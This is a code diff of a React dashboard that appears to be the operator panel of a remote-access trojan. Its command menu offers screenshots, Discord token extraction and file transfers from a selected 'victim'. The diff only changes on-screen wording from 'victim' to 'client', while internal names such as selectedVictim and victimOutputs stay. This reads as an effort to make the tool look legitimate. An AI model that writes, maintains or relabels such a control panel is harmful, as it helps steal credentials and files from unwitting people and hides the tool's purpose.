@@ -159,13 +159,13 @@ export default function Dashboard() {
             </option>
             <option value="startCalc">Start Calculator (All)</option>
             <option value="startScreenshot">
-              Take Screenshot ({selectedVictim || "No victim selected"})
+              Take Screenshot ({selectedVictim || "No client selected"})
             </option>
             <option value="startDiscordExtract">
-              Extract Discord Tokens ({selectedVictim || "No victim selected"})
+              Extract Discord Tokens ({selectedVictim || "No client selected"})
             </option>
             <option value="startFileTransfer">
-              Start File Transfer ({selectedVictim || "No victim selected"})
+              Start File Transfer ({selectedVictim || "No client selected"})
             </option>
           </select>
 
@@ -180,7 +180,7 @@ export default function Dashboard() {
         {/* Top Bar */}
         <div style={styles.topBar}>
           <h2 style={styles.topBarTitle}>
-            {selectedVictim || "No victim selected"}
+            {selectedVictim || "No client selected"}
           </h2>
           <div>
             <button
@@ -210,7 +210,7 @@ export default function Dashboard() {
             <pre style={styles.outputText}>
               {selectedVictim && victimOutputs[selectedVictim]
                 ? victimOutputs[selectedVictim]
-                : "No output for selected victim."}
+                : "No output for selected client."}
             </pre>
           ) : (
             <div style={styles.logContainer}>
